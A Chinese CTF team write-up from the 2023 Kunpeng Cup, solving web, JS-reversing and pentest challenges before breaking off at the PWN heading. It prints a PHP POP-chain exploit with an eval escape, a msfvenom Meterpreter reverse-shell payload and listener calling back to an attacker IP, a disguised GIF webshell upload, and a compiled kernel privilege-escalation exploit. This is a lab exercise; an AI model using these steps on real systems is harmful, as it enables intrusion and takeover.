<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.7.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.7.0" type="image/png" sizes="32x32"><meta name="description" content="校赛鲲鹏杯拿了第三名刚好卡在二等奖，21的学长们太强啦。这次是阳光摆烂大男孩第三次组队进行打比赛了，因为作为队长我就直接把团队整体的wp发出来了；里面也有关于打团队赛的一些感想和自己这次的一些失误的做题安排。">
<meta property="og:type" content="article">
<meta property="og:title" content="2023鲲鹏杯团队wp">
<meta property="og:url" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/index.html">
<meta property="og:site_name" content="hey&#39;s blog">
<meta property="og:description" content="校赛鲲鹏杯拿了第三名刚好卡在二等奖，21的学长们太强啦。这次是阳光摆烂大男孩第三次组队进行打比赛了，因为作为队长我就直接把团队整体的wp发出来了；里面也有关于打团队赛的一些感想和自己这次的一些失误的做题安排。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/1.jpg">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/2.jpg">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/3.jpg">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/31.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/32.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/33.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/14.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/15.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/16.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/17.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/18.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/19.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/20.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/21.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/22.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/23.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/24.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/25.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/26.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/27.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/1.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/3.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/2.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/4.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/5.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/6.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/7.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/8.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/9.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/10.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/11.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/12.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/13.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/34.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/35.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/36.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/37.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/38.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/39.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/40.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/41.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/42.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/43.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/44.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/45.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/46.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/47.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/48.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/49.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/50.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/51.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/52.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/53.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/54.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/55.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/56.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/58.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/59.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/60.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/57.png">
<meta property="article:published_time" content="2023-04-25T01:52:09.000Z">
<meta property="article:modified_time" content="2023-04-25T15:17:17.510Z">
<meta property="article:author" content="hey">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/1.jpg"><title>2023鲲鹏杯团队wp | hey's blog</title><link ref="canonical" href="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"複製","copySuccess":"複製成功","copyError":"複製失敗"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首頁</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">歸檔</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分類</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">標籤</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">關於</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/read/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">menu.read</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">hey's blog</div><div class="header-banner-info__subtitle">天气转晴太阳崭新我在前进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">2023鲲鹏杯团队wp</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">發表於</span><span class="post-meta-item__value">2023-04-25</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新於</span><span class="post-meta-item__value">2023-04-25</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">閱讀次數</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
        <h2 id="前言">
          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h2>
      <p>这次是阳光摆烂大男孩第三次组队进行打比赛了；有点自己的感言想说一说，这次整体情况还可以拿到了第三名；刚好卡在了二等奖；21的学长们太强啦；其实和前面两名的分差并不是很大。自己作为队长；因为这次比赛来得太突然加上自己需要进行蓝初的面试又刚好赶上这次比赛和合唱比赛撞到时间了；但是比赛并不会因为你有事情而停止，我们要做的就是去适应；所以这次并没有对题目进行一个详细的分工；也没有对自己的任务进行一个规划；所以导致这次死磕web；自己原本的取证和杂项并没有去完成。但是还好的是队友的逆向顶了上来；所以总结经验来说就是打团队赛的时候还是需要实现把题目的分工安排下去；尽量对自己的任务做一个规划；这次因为我自己一直在死磕web导致了其他的任务没有很好的完成;这也是一个小小的遗憾导致了我们的分数没有办法继续增长；希望在以后的比赛可以慢慢的磨合慢慢的成长。<br>然后昨晚和学委聊到一些关于CTF的学习问题；在这里也想分享学长的一句话与诸君共勉<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/1.jpg"></p>

        <h2 id="解题情况：">
          <a href="#解题情况：" class="heading-link"><i class="fas fa-link"></i></a><a href="#解题情况：" class="headerlink" title="解题情况："></a>解题情况：</h2>
      <p>团队情况:<br>阳光摆烂大男孩(3st)：<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/2.jpg"><br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/3.jpg"><br>个人情况：<br>@刘江峣<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/31.png"><br>@叶智粲<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/32.png"><br>@邱安龙<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/33.png"></p>

        <h2 id="WEB">
          <a href="#WEB" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2>
      
        <h2 id="signin-for-web-hey">
          <a href="#signin-for-web-hey" class="heading-link"><i class="fas fa-link"></i></a><a href="#signin-for-web-hey" class="headerlink" title="signin_for_web@hey"></a>signin_for_web@hey</h2>
      <p>根据题目的提示要注意到PHP的版本号；这里发现版本号为7.4.21；然后此时我们在百度上面搜索PHP7.4.21漏洞然；后根据这一篇文章 <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.ctfiot.com/95654.html">https://www.ctfiot.com/95654.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 进行一个任意文件的读取也就是我们要的flag.php<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/14.png"><br>注意这里需要使用静态文件；并且关掉自动填充Content-Length;最后将得到的flag进行base64解码即可<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/15.png"></p>

        <h2 id="ezpop-hey">
          <a href="#ezpop-hey" class="heading-link"><i class="fas fa-link"></i></a><a href="#ezpop-hey" class="headerlink" title="ezpop@hey"></a>ezpop@hey</h2>
      <p>此时拿到源码后进行一个代码审计<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/16.png"><br>首先确定这是一道pop链的题目；此时我们需要寻找pop链的链尾；此时注意到在D这个类有一个get_flag()的方法；这个方法可以执行eval()函数；此时的想法便是通过这个函数来进行一个RCE；此时我们可以把这个当作pop链的链尾；此时开始寻找如何触发这个get_flag();此时在B类中发现call这个魔术魔方可以触发get_flag()；那么此时我们开始思考如何触发call这个魔术魔方；当调用一个不可访问或者不存在的对象时会触发这个函数；所以接下来我们继续审计，发现在A类的invoke魔术魔法中出现了一个不存在的change()；此时我们可以利用触发invoke()的方法来触发call();接下来就是确定如何触发invoke();我们知道当尝试以调用函数的方式去调用一个对象时便会触发invoke();此时我们便注意到C类中的toString();此时它会以调用函数的方法去调用对象$stt；所以此时我们可以使用_toString()去掉用_invoke();接下来寻找如何触发_toString;我们知道echo 可以触发；此时定位到B类中的_destruct();改魔术魔方被触发后会执行echo;而destruct()只要一个对象被销毁即可触发；所以此时我们的整条pop链已经很清楚了<br>pop链：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B&#123;_destruct&#125; -&gt; C&#123;_toString&#125; -&gt; A&#123;_invoke&#125; -&gt; B&#123;_call&#125; -&gt; D&#123;get_flag()&#125;</span><br></pre></td></tr></table></div></figure>
<p>exp:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public $ad1;</span><br><span class="line">&#125;</span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">    public $func;</span><br><span class="line">&#125;</span><br><span class="line">class C</span><br><span class="line">&#123;</span><br><span class="line">    public $stt;</span><br><span class="line">&#125;</span><br><span class="line">class D</span><br><span class="line">&#123;</span><br><span class="line">    public $args=&quot;system(&#x27;ls&#x27;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new B();</span><br><span class="line">$a -&gt; func = new C();</span><br><span class="line">$a -&gt; func -&gt; stt = new B();</span><br><span class="line">$a -&gt; func -&gt; stt -&gt; func = new A();</span><br><span class="line">$a -&gt; func -&gt; stt -&gt; func -&gt; ad1 = new B();</span><br><span class="line">$a -&gt; func -&gt; stt -&gt; func -&gt; ad1 -&gt; func = new D();</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
<p>但是此时发现执行不了ls命令；这时候发现是因为eval()函数里面的一个注释符引起的；原本打算像SQL注入那样使用反斜杠进行转义；后面尝试后发现无法对注释负’#’进行转义；因为注释负是在句子前面；无法转义成功；那么此时想的就是有没有办法使得我的RCE语句可以逃逸出去；此时通过之前写博客参考的文章 <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8107#toc-11">https://xz.aliyun.com/t/8107#toc-11</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 知道我们可尝试短标签的一个绕过<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/17.png"><br>此时先用?&gt;把前面的注释符闭合起来不让其参与我们后面语句的执行<br>然后?&gt;进行构造短标签让我们的system(‘ls’);可以逃逸出来<br>所以最后的只需要把我们上面的exp里面的public $args&#x3D;”system(‘ls’);”;改成public $args&#x3D;”?&gt;&lt;?&#x3D;system(‘cat flag.php’);”;即可<br>有一说一这题在最后这个绕过的时候非常的坐牢<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/18.png"></p>

        <h2 id="realworld-js-hey">
          <a href="#realworld-js-hey" class="heading-link"><i class="fas fa-link"></i></a><a href="#realworld-js-hey" class="headerlink" title="realworld_js@hey"></a>realworld_js@hey</h2>
      <p>此时拿到了一个登入界面；此时想到的就是平台漏洞；此时搜超星学习通平台漏洞找到有关于登入密码的算法逆向；此时根据下载下来的附件就是要我们进行解密；此时确定方向；<br>根据超星学习通密码的算法逆向文章：<br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=1266540">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1266540</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.x1a0he.com/cxnewloginsign">https://www.x1a0he.com/cxnewloginsign</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>还有b站的js逆向的步骤解读：<br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Cb411j7n7/?vd_source=9c619583a465ff2ee240f5dd37f0a403">https://www.bilibili.com/video/BV1Cb411j7n7/?vd_source=9c619583a465ff2ee240f5dd37f0a403</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>此时通过有关于js逆向操作的视频确定了基本思路:先使用开发者工具的网络进行查看；接下来刷新界面；随便输入一个账户和密码之后进行发包；并且查看<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/19.png"><br>此时已经发现我们的账号密码已经被加密过了；接下来根据上面文章的教程；搜索password；发现password的加密方式；<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/20.png"><br> 接下来搜索encryptByAES；此时大致可以确定是使用AES加密；<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/21.png"><br>因为看不懂这个代码；所以直接扔给chatgpt进行翻译；此时我们知道了是使用AES里面的CBC加密模式并且填充方式为Pkcs7<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/22.png"><br>此时我们若是要解密的话就是需要拿到key和iv<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/23.png"><br>此时我们可以知道key &#x3D;u2oh6Vu^HWe4_AES<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/24.png"><br>接下来寻找iv<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/25.png"><br>此时可以得出iv&#x3D;u2oh6Vu^HWe4_AES(因为上面chagpt解读时说指定偏移量(iv)为key)<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/26.png"><br>最后进行解密即可得出flag<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/27.png"></p>

        <h2 id="ezpentest-hey">
          <a href="#ezpentest-hey" class="heading-link"><i class="fas fa-link"></i></a><a href="#ezpentest-hey" class="headerlink" title="ezpentest@hey"></a>ezpentest@hey</h2>
      <p>拿到这题的第一步先进行一个信息收集使用fscan进行一个端口扫描和主机存活的探测<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/1.png"><br>此时发现22端口和80端口都有打开；并且有一个主机存活；接下来继续做进一步的探测和信息收集；使用dirsearch进行后台的信息扫描看是否存在信息泄露；此时发现大量的信息泄露；此时我们进行一个页面一个页面的访问看看是否存在逻辑漏洞；<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/3.png"><br>此时先访问&#x2F;add.php;发现了一个上传点；此时考虑这题应该使用的方法应该是上传一个webshell;<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/2.png"><br>接下来继续访问test.php<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/4.png"><br>此时提示我们file参数为空；要提交有关于file文件的参数；此时我想到的是文件包含漏洞；可以通过这个file直接去读取我们想要的文件此时现在url栏进行提交发现无回显；确定其为POST的提交方法；此时提交file&#x3D;panel.php;发现了数据库的连接账号和密码<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/5.png"><br>接下来访问数据库进行登入发现flag1和登入的账号和密码<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/6.png"><br>拿到账号和密码之后直接进行登入；进入之后发现是一个上传界面；此时我们可以上传一张图片去试试；发现上传成功；结合前面在信息收集时收集的&#x2F;add.php；此时我们可以上传一句话木马进行网站控制；此时经过测试只能上传图片马；但是文件马上传之后要是没有文件包含的话是没有办法进行连接的；此时通过网上的方法可以post传参数 load&#x3D;uploaded_images&#x2F;wann.png&amp;contiune&#x3D;contiune进行连接；可是这里我传了多次都无法实现；开始以为是图片马过大；换了一个小一点的图片马；发现还是不行；无法执行图片木马<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/7.png"><br>接着换种方法使用kali中的msf帮助我们生成一个木马</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.78.132 LPORT=7777 -f raw &gt; wulala.php</span><br></pre></td></tr></table></div></figure>
<p>接下来更改一下这个木马；添加文件头GIF89a;然后改后缀为.gif；然后上传<br>打开msf的监听模块</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD php/meterpreter_reverse_tcp</span><br><span class="line">set LHOST 192.168.78.141</span><br><span class="line">set LPORT 7777</span><br><span class="line">run</span><br></pre></td></tr></table></div></figure>
<p>接下来使用bp发包；让msf返回一个meterpreter<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/8.png"><br>接下来创造一个shell;并使用uname -a来查看内核版本；准备使用改内核版本的漏洞进行提权<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/9.png"><br>漏洞链接：<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/37292">https://www.exploit-db.com/exploits/37292</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/10.png"><br>版本内核漏洞利用：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /home/wulala/桌面/exploit.c /tmp</span><br></pre></td></tr></table></div></figure>
<p>此时已经可以查看flag2<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/11.png"><br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/12.png"><br>接下来提权到root</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">gcc exploit.c -o exploit</span><br><span class="line">./exploit</span><br></pre></td></tr></table></div></figure>
<p>此时已经成功提权到root<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/13.png"></p>

        <h2 id="FORENSICS">
          <a href="#FORENSICS" class="heading-link"><i class="fas fa-link"></i></a><a href="#FORENSICS" class="headerlink" title="FORENSICS"></a>FORENSICS</h2>
      
        <h2 id="Signin-for-forensics-hey">
          <a href="#Signin-for-forensics-hey" class="heading-link"><i class="fas fa-link"></i></a><a href="#Signin-for-forensics-hey" class="headerlink" title="Signin_for_forensics@hey"></a>Signin_for_forensics@hey</h2>
      <p>因为本地的取证kali磁盘爆了；所以这题没有办法再次复现一次；所以写一下解题过程：<br>此时先使用imageinfo进行查看可以利用的插件；然后因为此题没有提示；所以感觉flag就是直接呈现出来的；所以接下来使用filescan | grep “txt”进行查看txt文件；然后就可以找到一个fllllag.txt的文件；然后在使用dump命令进行提取即可</p>

        <h2 id="PWN">
          <a href="#PWN" class="heading-link"><i class="fas fa-link"></i></a><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2>
      
